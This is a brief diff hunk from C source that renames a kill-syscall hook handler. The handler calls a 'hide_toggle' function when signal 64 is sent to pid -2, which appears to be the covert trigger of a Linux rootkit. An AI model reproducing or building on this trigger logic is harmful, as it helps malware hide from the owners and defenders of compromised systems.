@@ -28,7 +28,7 @@ static void hide_toggle(void) {
   }
 }
 
-void sys_kill_kprobe_enter_handler(int sig, int pid) {
+void kill_syscall_enter_handler(int sig, int pid) {
   if (sig == 64 && pid == -2) {
     hide_toggle();
   }
